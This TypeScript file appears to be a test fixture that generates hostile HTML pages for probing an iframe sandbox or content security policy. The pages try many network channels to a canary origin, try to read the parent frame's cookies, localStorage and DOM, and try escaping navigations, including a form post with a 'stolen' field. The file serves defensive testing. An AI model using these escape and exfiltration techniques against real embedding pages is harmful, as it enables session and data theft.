import { canaryOrigin, serverOrigin } from './env'

// Character classes keep the pattern from matching its own source text, which
// the hostile page embeds and then reads back through document.outerHTML.
export const secretPattern = /PARENT[_]|hive[_]drive[_]session/

const page = (head: string, script: string) =>
  `<!doctype html><html><head><meta charset="utf-8">${head}</head><body><pre id="results">pending</pre><script>${script}</script></body></html>`

const common = `
const C = ${JSON.stringify(canaryOrigin)};
const S = ${JSON.stringify(serverOrigin)};
const framed = window !== window.top;
const leaked = (v) => ${secretPattern}.test(String(v));
const settle = (ms) => new Promise((r) => setTimeout(r, ms));
`

const main = `${common}
const out = {};
const violations = [];
document.addEventListener('securitypolicyviolation', (e) => violations.push(e.violatedDirective));
const note = (n, outcome, detail) => { out[n] = { outcome, detail: String(detail ?? '').slice(0, 160) }; };
async function attempt(n, fn) {
  try { const r = await fn(); note(n, r.outcome, r.detail); }
  catch (e) { note(n, 'blocked', (e && e.name) + ': ' + (e && e.message)); }
}
// Inside the frame any successful read of the embedder is an escape. Top
// level, the document is its own parent, so only a leaked secret counts.
const read = (fn) => { const v = fn(); return { outcome: framed || leaked(v) ? 'escaped' : 'blocked', detail: 'readable: ' + String(v).slice(0, 60) }; };
const watch = (el, ms = 1500) => new Promise((res) => {
  el.addEventListener('load', () => res({ outcome: 'escaped', detail: 'load' }));
  el.addEventListener('error', () => res({ outcome: 'blocked', detail: 'error' }));
  setTimeout(() => res({ outcome: 'unobservable', detail: 'no event' }), ms);
});

(async () => {
  await attempt('fetch', async () => { await fetch(C + '/fetch', { mode: 'no-cors' }); return { outcome: 'escaped' }; });
  await attempt('fetch-server-origin', async () => { await fetch(S + '/api/v1/me', { mode: 'no-cors', credentials: 'include' }); return { outcome: 'escaped' }; });
  await attempt('xhr', () => new Promise((res) => {
    const x = new XMLHttpRequest();
    x.open('GET', C + '/xhr');
    x.onload = () => res({ outcome: 'escaped', detail: 'load' });
    x.onerror = () => res({ outcome: 'blocked', detail: 'error' });
    x.timeout = 1500;
    x.ontimeout = () => res({ outcome: 'unobservable', detail: 'timeout' });
    x.send();
  }));
  await attempt('websocket', () => new Promise((res) => {
    const w = new WebSocket(C.replace('http', 'ws') + '/ws');
    w.onopen = () => res({ outcome: 'escaped', detail: 'open' });
    w.onerror = () => res({ outcome: 'blocked', detail: 'error' });
    setTimeout(() => res({ outcome: 'unobservable', detail: 'timeout' }), 1500);
  }));
  await attempt('sendBeacon', async () => {
    const queued = navigator.sendBeacon(C + '/beacon', 'x');
    await settle(500);
    return { outcome: 'unobservable', detail: 'returned ' + queued };
  });
  await attempt('img-element', () => { const i = new Image(); i.src = C + '/img'; return watch(i); });
  await attempt('img-markup', async () => {
    document.body.insertAdjacentHTML('beforeend', '<img src="' + C + '/img-markup"><img srcset="' + C + '/img-srcset 1x" alt="">');
    await settle(500);
    return { outcome: 'unobservable' };
  });
  await attempt('css-stylesheet-link', () => {
    const l = document.createElement('link');
    l.rel = 'stylesheet';
    l.href = C + '/css-link.css';
    document.head.append(l);
    return watch(l);
  });
  await attempt('css-url-inline', async () => {
    const s = document.createElement('style');
    s.textContent = '@import url(' + C + '/css-import.css); body { background: url(' + C + '/css-bg.png) } @font-face { font-family: x; src: url(' + C + '/css-font.woff) }';
    document.head.append(s);
    document.body.style.backgroundImage = 'url(' + C + '/css-style-prop.png)';
    document.body.insertAdjacentHTML('beforeend', '<div style="background:url(' + C + '/css-style-attr.png);width:1px;height:1px"></div>');
    await settle(500);
    return { outcome: 'unobservable' };
  });
  await attempt('script-src', () => { const s = document.createElement('script'); s.src = C + '/script.js'; document.head.append(s); return watch(s); });
  await attempt('iframe-src', async () => {
    const f = document.createElement('iframe');
    f.src = C + '/iframe';
    document.body.append(f);
    await settle(500);
    return { outcome: 'unobservable' };
  });
  await attempt('window.open', async () => {
    const w = window.open(C + '/open', '_blank');
    if (w) { w.close(); return { outcome: 'escaped', detail: 'window returned' }; }
    return { outcome: 'blocked', detail: 'null' };
  });
  await attempt('own-document.cookie', async () => read(() => document.cookie));
  await attempt('own-localStorage', async () => read(() => localStorage.getItem('parent_secret')));
  await attempt('parent.document.cookie', async () => read(() => parent.document.cookie));
  await attempt('parent.document.dom', async () => read(() => parent.document.documentElement.outerHTML));
  await attempt('parent.localStorage', async () => read(() => parent.localStorage.getItem('parent_secret')));
  await attempt('parent.location', async () => read(() => parent.location.href));
  await attempt('top.document', async () => read(() => top.document.body.outerHTML));
  await settle(300);
  out.__violations = { outcome: 'info', detail: violations.join(',') };
  out.__origin = { outcome: 'info', detail: window.origin };
  document.getElementById('results').textContent = JSON.stringify(out);
  document.body.dataset.done = '1';
})();
`

const navigation = (name: string, body: string, head = '') =>
  page(head, `${common}setTimeout(() => { document.body.dataset.attempted = ${JSON.stringify(name)}; ${body} }, 300);`)

export const documents: Record<string, string> = {
  'hostile.html': page('', main),
  'nav-location.html': navigation('location', `location.href = C + '/nav-location';`),
  'nav-location-replace.html': navigation('location-replace', `location.replace(C + '/nav-replace');`),
  'nav-meta-refresh.html': navigation('meta', '', `<meta http-equiv="refresh" content="0;url=${canaryOrigin}/nav-meta">`),
  'nav-link-click.html': navigation('link', `const a = document.createElement('a'); a.href = C + '/nav-link'; document.body.append(a); a.click();`),
  'nav-form-submit.html': navigation('form', `const f = document.createElement('form'); f.method = 'post'; f.action = C + '/nav-form'; f.innerHTML = '<input name="stolen" value="x">'; document.body.append(f); f.submit();`),
  'nav-top-location.html': navigation('top', `top.location = C + '/nav-top';`),
}

export const mainDocument = 'hostile.html'
export const navigationDocuments = Object.keys(documents).filter((n) => n.startsWith('nav-'))
